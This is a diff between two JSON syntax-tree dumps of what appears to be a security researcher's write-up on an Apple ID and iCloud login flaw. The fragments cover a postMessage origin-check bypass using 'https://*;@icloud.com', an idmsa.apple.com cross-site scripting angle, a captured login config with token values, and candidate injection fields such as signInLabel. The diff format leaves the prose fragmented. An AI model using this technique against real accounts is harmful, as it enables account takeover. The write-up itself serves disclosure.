<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "It's Not Always That You Need to Read The Spec, But That Always is Today.",
<           "position": {
<             "start": {
<               "line": 986,
<               "column": 1,
<               "offset": 47390
<             },
<             "end": {
<               "line": 986,
<               "column": 74,
<               "offset": 47463
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 986,
<           "column": 1,
<           "offset": 47390
<         },
<         "end": {
<           "line": 987,
<           "column": 67,
<           "offset": 47531
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "it's not always that you need to read the spec, but that always is today.",
<       "label": "It's Not Always That You Need to Read The Spec, But That Always is Today.",
<       "title": null,
<       "url": "#its-not-always-that-you-need-to-read-the-spec-but-that-always-is-today",
<       "position": {
<         "start": {
<           "line": 988,
<           "column": 1,
<           "offset": 47533
<         },
<         "end": {
<           "line": 988,
<           "column": 149,
<           "offset": 47681
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§8",
<       "label": "§8",
<       "title": null,
<       "url": "#its-not-always-that-you-need-to-read-the-spec-but-that-always-is-today",
<       "position": {
<         "start": {
<           "line": 989,
<           "column": 1,
<           "offset": 47683
<         },
<         "end": {
<           "line": 989,
<           "column": 78,
<           "offset": 47760
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Now we have a sneaky way to push data to ",
<           "position": {
<             "start": {
<               "line": 991,
<               "column": 1,
<               "offset": 47764
<             },
<             "end": {
<               "line": 991,
<               "column": 42,
<               "offset": 47805
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 991,
<               "column": 42,
<               "offset": 47805
<             },
<             "end": {
<               "line": 991,
<               "column": 59,
<               "offset": 47822
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " without getting checked by the access control list. But how do we receive messages without being ",
<           "position": {
<             "start": {
<               "line": 991,
<               "column": 59,
<               "offset": 47822
<             },
<             "end": {
<               "line": 991,
<               "column": 157,
<               "offset": 47920
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 991,
<               "column": 157,
<               "offset": 47920
<             },
<             "end": {
<               "line": 991,
<               "column": 169,
<               "offset": 47932
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "?",
<           "position": {
<             "start": {
<               "line": 991,
<               "column": 169,
<               "offset": 47932
<             },
<             "end": {
<               "line": 991,
<               "column": 170,
<               "offset": 47933
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 991,
<           "column": 1,
<           "offset": 47764
<         },
<         "end": {
<           "line": 991,
<           "column": 170,
<           "offset": 47933
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I noticed via live debugging that the origin that ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 1,
<               "offset": 47937
<             },
<             "end": {
<               "line": 993,
<               "column": 51,
<               "offset": 47987
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 51,
<               "offset": 47987
<             },
<             "end": {
<               "line": 993,
<               "column": 68,
<               "offset": 48004
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " was sending messages to was ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 68,
<               "offset": 48004
<             },
<             "end": {
<               "line": 993,
<               "column": 97,
<               "offset": 48033
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
15577,15578c19763,19767
<               "type": "text",
<               "value": "not",
---
>               "type": "definition",
>               "identifier": "stealing the bank from an atm",
>               "label": "Stealing the Bank From an ATM",
>               "title": null,
>               "url": "#stealing-the-bank-from-an-atm",
15581,15583c19770,19772
<                   "line": 993,
<                   "column": 98,
<                   "offset": 48034
---
>                   "line": 1057,
>                   "column": 1,
>                   "offset": 54270
15586,15588c19775,19777
<                   "line": 993,
<                   "column": 101,
<                   "offset": 48037
---
>                   "line": 1057,
>                   "column": 64,
>                   "offset": 54333
15592,15683d19780
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 97,
<               "offset": 48033
<             },
<             "end": {
<               "line": 993,
<               "column": 102,
<               "offset": 48038
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 102,
<               "offset": 48038
<             },
<             "end": {
<               "line": 993,
<               "column": 103,
<               "offset": 48039
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 103,
<               "offset": 48039
<             },
<             "end": {
<               "line": 993,
<               "column": 115,
<               "offset": 48051
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", but the full ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 115,
<               "offset": 48051
<             },
<             "end": {
<               "line": 993,
<               "column": 130,
<               "offset": 48066
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 130,
<               "offset": 48066
<             },
<             "end": {
<               "line": 993,
<               "column": 144,
<               "offset": 48080
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 144,
<               "offset": 48080
15685,15840d19781
<             "end": {
<               "line": 993,
<               "column": 146,
<               "offset": 48082
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://*;@icloud.com",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 146,
<               "offset": 48082
<             },
<             "end": {
<               "line": 993,
<               "column": 169,
<               "offset": 48105
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". This is a super odd one because ",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 169,
<               "offset": 48105
<             },
<             "end": {
<               "line": 993,
<               "column": 203,
<               "offset": 48139
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 203,
<               "offset": 48139
<             },
<             "end": {
<               "line": 993,
<               "column": 216,
<               "offset": 48152
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is specified",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 216,
<               "offset": 48152
<             },
<             "end": {
<               "line": 993,
<               "column": 229,
<               "offset": 48165
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "footnoteReference",
<           "identifier": "1",
<           "label": "1",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 229,
<               "offset": 48165
<             },
<             "end": {
<               "line": 993,
<               "column": 233,
<               "offset": 48169
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " like this:",
<           "position": {
<             "start": {
<               "line": 993,
<               "column": 233,
<               "offset": 48169
<             },
<             "end": {
<               "line": 993,
<               "column": 244,
<               "offset": 48180
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 993,
<           "column": 1,
<           "offset": 47937
<         },
<         "end": {
<           "line": 993,
<           "column": 244,
<           "offset": 48180
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "targetWindow.postMessage(message, targetOrigin, [transfer]);",
<       "position": {
<         "start": {
<           "line": 995,
<           "column": 1,
<           "offset": 48184
<         },
<         "end": {
<           "line": 997,
<           "column": 4,
<           "offset": 48264
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "footnoteDefinition",
<       "identifier": "1",
<       "label": "1",
<       "children": [
<         {
<           "type": "paragraph",
<           "children": [
15842c19783,19785
<               "type": "link",
---
>               "type": "definition",
>               "identifier": "§9",
>               "label": "§9",
15844c19787,19803
<               "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
---
>               "url": "#stealing-the-bank-from-an-atm",
>               "position": {
>                 "start": {
>                   "line": 1058,
>                   "column": 1,
>                   "offset": 54335
>                 },
>                 "end": {
>                   "line": 1058,
>                   "column": 37,
>                   "offset": 54371
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
15848c19807
<                   "value": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
---
>                   "value": "Getting ",
15851,15853c19810,19812
<                       "line": 999,
<                       "column": 7,
<                       "offset": 48274
---
>                       "line": 1060,
>                       "column": 1,
>                       "offset": 54375
15856,15858c19815,19851
<                       "line": 999,
<                       "column": 74,
<                       "offset": 48341
---
>                       "line": 1060,
>                       "column": 9,
>                       "offset": 54383
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 1060,
>                       "column": 9,
>                       "offset": 54383
>                     },
>                     "end": {
>                       "line": 1060,
>                       "column": 26,
>                       "offset": 54400
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " XSS turned out way, way easier than expected, probably due to the position of leverage we find ourselves in. Apple ID already thinks we're a first party Apple app, and gives us ridiculously free control over how we display the login dialog.",
>                   "position": {
>                     "start": {
>                       "line": 1060,
>                       "column": 26,
>                       "offset": 54400
>                     },
>                     "end": {
>                       "line": 1060,
>                       "column": 267,
>                       "offset": 54641
15866,15868c19859,19861
<                   "line": 999,
<                   "column": 7,
<                   "offset": 48274
---
>                   "line": 1060,
>                   "column": 1,
>                   "offset": 54375
15871,15873c19864,19866
<                   "line": 999,
<                   "column": 74,
<                   "offset": 48341
---
>                   "line": 1060,
>                   "column": 267,
>                   "offset": 54641
15879,15880c19872,19891
<               "type": "text",
<               "value": " \"Window.postMessage() - Web APIs | MDN\"",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Take a look at the configuration that iCloud sends to Apple ID to request a specific login display:",
>                   "position": {
>                     "start": {
>                       "line": 1062,
>                       "column": 1,
>                       "offset": 54645
>                     },
>                     "end": {
>                       "line": 1062,
>                       "column": 100,
>                       "offset": 54744
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
15883,15885c19894,19896
<                   "line": 999,
<                   "column": 74,
<                   "offset": 48341
---
>                   "line": 1062,
>                   "column": 1,
>                   "offset": 54645
15888,15890c19899,19901
<                   "line": 999,
<                   "column": 114,
<                   "offset": 48381
---
>                   "line": 1062,
>                   "column": 100,
>                   "offset": 54744
15894,15991d19904
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 999,
<               "column": 7,
<               "offset": 48274
<             },
<             "end": {
<               "line": 999,
<               "column": 114,
<               "offset": 48381
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 999,
<           "column": 1,
<           "offset": 48268
<         },
<         "end": {
<           "line": 999,
<           "column": 114,
<           "offset": 48381
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "inlineCode",
<           "value": "targetOrigin",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 1,
<               "offset": 48385
<             },
<             "end": {
<               "line": 1001,
<               "column": 15,
<               "offset": 48399
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " would indicate that what should be passed in is an HTTP web origin, which has to be very strictly specified and for which, as mentioned before ",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 15,
<               "offset": 48399
<             },
<             "end": {
<               "line": 1001,
<               "column": 159,
<               "offset": 48543
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://*;@icloud.com",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 159,
<               "offset": 48543
<             },
<             "end": {
<               "line": 1001,
<               "column": 182,
<               "offset": 48566
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is absolutely ",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 182,
<               "offset": 48566
<             },
<             "end": {
<               "line": 1001,
<               "column": 197,
<               "offset": 48581
15993,15998d19905
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
16000,16001c19907,19910
<               "type": "text",
<               "value": "not",
---
>               "type": "code",
>               "lang": "json",
>               "meta": null,
>               "value": "parent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":{\"data\":{\"features\":{\"rememberMe\":true,\"createLink\":false,\"iForgotLink\":true,\"pause2FA\":false},\"signInLabel\":\"Sign in to iCloud\",\"serviceKey\":\"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\"defaultAccountNameAutoFillDomain\":\"icloud.com\",\"trustTokens\":[\"HSARMTnl/S90E=SRVX\"],\"rememberMeLabel\":\"keep-me-signed-in\",\"theme\":\"dark\",\"waitAnimationOnAuthComplete\":false,\"logo\":{\"src\":\"data:image/png;base64,[ ... ]ErkJggg==\",\"width\":\"100px\"}}}}",
16004,16006c19913,19915
<                   "line": 1001,
<                   "column": 198,
<                   "offset": 48582
---
>                   "line": 1064,
>                   "column": 1,
>                   "offset": 54748
16009,16011c19918,19920
<                   "line": 1001,
<                   "column": 201,
<                   "offset": 48585
---
>                   "line": 1066,
>                   "column": 4,
>                   "offset": 55303
16013c19922,19925
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1
>                 ]
16015,16146d19926
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 197,
<               "offset": 48581
<             },
<             "end": {
<               "line": 1001,
<               "column": 202,
<               "offset": 48586
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " valid. In theory, that'd probably just mean that the call should never be able to get to us, but I dived into the ",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 202,
<               "offset": 48586
<             },
<             "end": {
<               "line": 1001,
<               "column": 317,
<               "offset": 48701
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 317,
<               "offset": 48701
<             },
<             "end": {
<               "line": 1001,
<               "column": 330,
<               "offset": 48714
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " specification, which defines",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 330,
<               "offset": 48714
<             },
<             "end": {
<               "line": 1001,
<               "column": 359,
<               "offset": 48743
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "footnoteReference",
<           "identifier": "2",
<           "label": "2",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 359,
<               "offset": 48743
<             },
<             "end": {
<               "line": 1001,
<               "column": 363,
<               "offset": 48747
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " the action of ",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 363,
<               "offset": 48747
<             },
<             "end": {
<               "line": 1001,
<               "column": 378,
<               "offset": 48762
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 378,
<               "offset": 48762
<             },
<             "end": {
<               "line": 1001,
<               "column": 391,
<               "offset": 48775
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " like this:",
<           "position": {
<             "start": {
<               "line": 1001,
<               "column": 391,
<               "offset": 48775
<             },
<             "end": {
<               "line": 1001,
<               "column": 402,
<               "offset": 48786
16148,16176d19927
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1001,
<           "column": 1,
<           "offset": 48385
<         },
<         "end": {
<           "line": 1001,
<           "column": 402,
<           "offset": 48786
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "list",
<       "ordered": true,
<       "start": 1,
<       "spread": false,
<       "children": [
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
16182c19933,20001
<                   "value": "Let ",
---
>                   "value": "There's a few configs that are just toggles, like ",
>                   "position": {
>                     "start": {
>                       "line": 1068,
>                       "column": 1,
>                       "offset": 55307
>                     },
>                     "end": {
>                       "line": 1068,
>                       "column": 51,
>                       "offset": 55357
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "rememberMe",
>                   "position": {
>                     "start": {
>                       "line": 1068,
>                       "column": 51,
>                       "offset": 55357
>                     },
>                     "end": {
>                       "line": 1068,
>                       "column": 63,
>                       "offset": 55369
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", ",
>                   "position": {
>                     "start": {
>                       "line": 1068,
>                       "column": 63,
>                       "offset": 55369
>                     },
>                     "end": {
>                       "line": 1068,
>                       "column": 65,
>                       "offset": 55371
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "createLink",
>                   "position": {
>                     "start": {
>                       "line": 1068,
>                       "column": 65,
>                       "offset": 55371
>                     },
>                     "end": {
>                       "line": 1068,
>                       "column": 77,
>                       "offset": 55383
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and ",
16185,16187c20004,20006
<                       "line": 1003,
<                       "column": 5,
<                       "offset": 48794
---
>                       "line": 1068,
>                       "column": 77,
>                       "offset": 55383
16190,16192c20009,20011
<                       "line": 1003,
<                       "column": 9,
<                       "offset": 48798
---
>                       "line": 1068,
>                       "column": 82,
>                       "offset": 55388
16199c20018
<                   "value": "targetRealm",
---
>                   "value": "iForgotLink",
16202,16204c20021,20023
<                       "line": 1003,
<                       "column": 9,
<                       "offset": 48798
---
>                       "line": 1068,
>                       "column": 82,
>                       "offset": 55388
16207,16209c20026,20028
<                       "line": 1003,
<                       "column": 22,
<                       "offset": 48811
---
>                       "line": 1068,
>                       "column": 95,
>                       "offset": 55401
16216c20035
<                   "value": " be ",
---
>                   "value": ". ",
16219,16221c20038,20040
<                       "line": 1003,
<                       "column": 22,
<                       "offset": 48811
---
>                       "line": 1068,
>                       "column": 95,
>                       "offset": 55401
16224,16226c20043,20045
<                       "line": 1003,
<                       "column": 26,
<                       "offset": 48815
---
>                       "line": 1068,
>                       "column": 97,
>                       "offset": 55403
16233c20052
<                   "value": "targetWindow",
---
>                   "value": "pause2FA",
16236,16238c20055,20057
<                       "line": 1003,
<                       "column": 26,
<                       "offset": 48815
---
>                       "line": 1068,
>                       "column": 97,
>                       "offset": 55403
16241,16243c20060,20062
<                       "line": 1003,
<                       "column": 40,
<                       "offset": 48829
---
>                       "line": 1068,
>                       "column": 107,
>                       "offset": 55413
16250c20069
<                   "value": "'s Realm.",
---
>                   "value": " is probably the one that 'Find My' uses to defer 2FA until after the user has found their lost iPhone.",
16253,16255c20072,20074
<                       "line": 1003,
<                       "column": 40,
<                       "offset": 48829
---
>                       "line": 1068,
>                       "column": 107,
>                       "offset": 55413
16258,16260c20077,20079
<                       "line": 1003,
<                       "column": 49,
<                       "offset": 48838
---
>                       "line": 1068,
>                       "column": 210,
>                       "offset": 55516
16268,16270c20087,20089
<                   "line": 1003,
<                   "column": 5,
<                   "offset": 48794
---
>                   "line": 1068,
>                   "column": 1,
>                   "offset": 55307
16273,16275c20092,20094
<                   "line": 1003,
<                   "column": 49,
<                   "offset": 48838
---
>                   "line": 1068,
>                   "column": 210,
>                   "offset": 55516
16279,16290d20097
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1003,
<               "column": 1,
<               "offset": 48790
<             },
<             "end": {
<               "line": 1003,
<               "column": 49,
<               "offset": 48838
16292,16299d20098
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
16305c20104
<                   "value": "Let ",
---
>                   "value": "But we have much freer inputs for ",
16308,16310c20107,20109
<                       "line": 1004,
<                       "column": 5,
<                       "offset": 48844
---
>                       "line": 1070,
>                       "column": 1,
>                       "offset": 55520
16313,16315c20112,20114
<                       "line": 1004,
<                       "column": 9,
<                       "offset": 48848
---
>                       "line": 1070,
>                       "column": 35,
>                       "offset": 55554
16322,16339c20121
<                   "value": "incumbentSettings",
<                   "position": {
<                     "start": {
<                       "line": 1004,
<                       "column": 9,
<                       "offset": 48848
<                     },
<                     "end": {
<                       "line": 1004,
<                       "column": 28,
<                       "offset": 48867
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": " be the incumbent settings object.",
---
>                   "value": "signInLabel",
16342,16344c20124,20126
<                       "line": 1004,
<                       "column": 28,
<                       "offset": 48867
---
>                       "line": 1070,
>                       "column": 35,
>                       "offset": 55554
16347,16349c20129,20131
<                       "line": 1004,
<                       "column": 62,
<                       "offset": 48901
---
>                       "line": 1070,
>                       "column": 48,
>                       "offset": 55567
16353,16364d20134
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1004,
<                   "column": 5,
<                   "offset": 48844
<                 },
<                 "end": {
<                   "line": 1004,
<                   "column": 62,
<                   "offset": 48901
16366,16391d20135
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1004,
<               "column": 1,
<               "offset": 48840
<             },
<             "end": {
<               "line": 1004,
<               "column": 62,
<               "offset": 48901
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
16394c20138
<                   "value": "Let ",
---
>                   "value": " and ",
16397,16399c20141,20143
<                       "line": 1005,
<                       "column": 5,
<                       "offset": 48907
---
>                       "line": 1070,
>                       "column": 48,
>                       "offset": 55567
16402,16404c20146,20148
<                       "line": 1005,
<                       "column": 9,
<                       "offset": 48911
---
>                       "line": 1070,
>                       "column": 53,
>                       "offset": 55572
16411c20155
<                   "value": "targetOrigin",
---
>                   "value": "logo.src",
16414,16416c20158,20160
<                       "line": 1005,
<                       "column": 9,
<                       "offset": 48911
---
>                       "line": 1070,
>                       "column": 53,
>                       "offset": 55572
16419,16421c20163,20165
<                       "line": 1005,
<                       "column": 23,
<                       "offset": 48925
---
>                       "line": 1070,
>                       "column": 63,
>                       "offset": 55582
16428c20172
<                   "value": " be ",
---
>                   "value": ". ",
16431,16433c20175,20177
<                       "line": 1005,
<                       "column": 23,
<                       "offset": 48925
---
>                       "line": 1070,
>                       "column": 63,
>                       "offset": 55582
16436,16438c20180,20182
<                       "line": 1005,
<                       "column": 27,
<                       "offset": 48929
---
>                       "line": 1070,
>                       "column": 65,
>                       "offset": 55584
16445c20189
<                   "value": "options[\"targetOrigin\"]",
---
>                   "value": "theme",
16448,16450c20192,20194
<                       "line": 1005,
<                       "column": 27,
<                       "offset": 48929
---
>                       "line": 1070,
>                       "column": 65,
>                       "offset": 55584
16453,16455c20197,20199
<                       "line": 1005,
<                       "column": 52,
<                       "offset": 48954
---
>                       "line": 1070,
>                       "column": 72,
>                       "offset": 55591
16462c20206
<                   "value": ".",
---
>                   "value": " also implies to me there might be a possible CSS injection as the 'dark' theme no doubt is a CSS class. ",
16465,16467c20209,20211
<                       "line": 1005,
<                       "column": 52,
<                       "offset": 48954
---
>                       "line": 1070,
>                       "column": 72,
>                       "offset": 55591
16470,16472c20214,20216
<                       "line": 1005,
<                       "column": 53,
<                       "offset": 48955
---
>                       "line": 1070,
>                       "column": 177,
>                       "offset": 55696
16480,16482c20224,20226
<                   "line": 1005,
<                   "column": 5,
<                   "offset": 48907
---
>                   "line": 1070,
>                   "column": 1,
>                   "offset": 55520
16485,16487c20229,20231
<                   "line": 1005,
<                   "column": 53,
<                   "offset": 48955
---
>                   "line": 1070,
>                   "column": 177,
>                   "offset": 55696
16491,16502d20234
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1005,
<               "column": 1,
<               "offset": 48903
<             },
<             "end": {
<               "line": 1005,
<               "column": 53,
<               "offset": 48955
16504,16511d20235
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
16517c20241
<                   "value": "If ",
---
>                   "value": "From Chrome Developer Tools, we can search all the recursive assets acquired by the login system as it loads. This should make it pretty easy to find out how these are sanitized and loaded into the page.",
16520,16522c20244,20246
<                       "line": 1006,
<                       "column": 5,
<                       "offset": 48961
---
>                       "line": 1072,
>                       "column": 1,
>                       "offset": 55700
16525,16527c20249,20251
<                       "line": 1006,
<                       "column": 8,
<                       "offset": 48964
---
>                       "line": 1072,
>                       "column": 204,
>                       "offset": 55903
16530a20255,20261
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1072,
>                   "column": 1,
>                   "offset": 55700
16531a20263,20273
>                 "end": {
>                   "line": 1072,
>                   "column": 204,
>                   "offset": 55903
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
16533,16534c20275,20276
<                   "type": "inlineCode",
<                   "value": "targetOrigin",
---
>                   "type": "text",
>                   "value": "There's a few hits for 'signInLabel', but this is the one that stands out most to me:",
16537,16539c20279,20281
<                       "line": 1006,
<                       "column": 8,
<                       "offset": 48964
---
>                       "line": 1074,
>                       "column": 1,
>                       "offset": 55907
16542,16544c20284,20286
<                       "line": 1006,
<                       "column": 22,
<                       "offset": 48978
---
>                       "line": 1074,
>                       "column": 86,
>                       "offset": 55992
16547a20290,20320
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1074,
>                   "column": 1,
>                   "offset": 55907
>                 },
>                 "end": {
>                   "line": 1074,
>                   "column": 86,
>                   "offset": 55992
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "d()(w.a, \"envConfigFromConsumer.signInLabel\", \"\").trim() && n.attr(\"signInLabel\", w.a.envConfigFromConsumer.signInLabel),",
>               "position": {
>                 "start": {
>                   "line": 1076,
>                   "column": 1,
>                   "offset": 55996
>                 },
>                 "end": {
>                   "line": 1078,
>                   "column": 4,
>                   "offset": 56137
16548a20322,20330
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
16551c20333
<                   "value": " is a single U+002F SOLIDUS character (/), then set ",
---
>                   "value": "It looks like when the config is sent, it gets assigned to ",
16554,16556c20336,20338
<                       "line": 1006,
<                       "column": 22,
<                       "offset": 48978
---
>                       "line": 1080,
>                       "column": 1,
>                       "offset": 56141
16559,16561c20341,20343
<                       "line": 1006,
<                       "column": 74,
<                       "offset": 49030
---
>                       "line": 1080,
>                       "column": 60,
>                       "offset": 56200
16568c20350
<                   "value": "targetOrigin",
---
>                   "value": "envConfigFromConsumer",
16571,16573c20353,20355
<                       "line": 1006,
<                       "column": 74,
<                       "offset": 49030
---
>                       "line": 1080,
>                       "column": 60,
>                       "offset": 56200
16576,16578c20358,20360
<                       "line": 1006,
<                       "column": 88,
<                       "offset": 49044
---
>                       "line": 1080,
>                       "column": 83,
>                       "offset": 56223
16585c20367
<                   "value": " to ",
---
>                   "value": ". If we look for that, we should be able to find a bunch of configuration options that they ",
16588,16590c20370,20372
<                       "line": 1006,
<                       "column": 88,
<                       "offset": 49044
---
>                       "line": 1080,
>                       "column": 83,
>                       "offset": 56223
16593,16595c20375,20377
<                       "line": 1006,
<                       "column": 92,
<                       "offset": 49048
---
>                       "line": 1080,
>                       "column": 175,
>                       "offset": 56315
16601,16602c20383,20402
<                   "type": "inlineCode",
<                   "value": "incumbentSettings",
---
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "don't",
>                       "position": {
>                         "start": {
>                           "line": 1080,
>                           "column": 176,
>                           "offset": 56316
>                         },
>                         "end": {
>                           "line": 1080,
>                           "column": 181,
>                           "offset": 56321
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
16605,16607c20405,20407
<                       "line": 1006,
<                       "column": 92,
<                       "offset": 49048
---
>                       "line": 1080,
>                       "column": 175,
>                       "offset": 56315
16610,16612c20410,20412
<                       "line": 1006,
<                       "column": 111,
<                       "offset": 49067
---
>                       "line": 1080,
>                       "column": 182,
>                       "offset": 56322
16619c20419
<                   "value": "'s origin.",
---
>                   "value": " use. If they're not used, then it's much less likely someone has looked at them and thought about security. There's quite a few:",
16622,16624c20422,20424
<                       "line": 1006,
<                       "column": 111,
<                       "offset": 49067
---
>                       "line": 1080,
>                       "column": 182,
>                       "offset": 56322
16627,16629c20427,20429
<                       "line": 1006,
<                       "column": 121,
<                       "offset": 49077
---
>                       "line": 1080,
>                       "column": 311,
>                       "offset": 56451
16637,16639c20437,20439
<                   "line": 1006,
<                   "column": 5,
<                   "offset": 48961
---
>                   "line": 1080,
>                   "column": 1,
>                   "offset": 56141
16642,16644c20442,20444
<                   "line": 1006,
<                   "column": 121,
<                   "offset": 49077
---
>                   "line": 1080,
>                   "column": 311,
>                   "offset": 56451
16648,16654d20447
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1006,
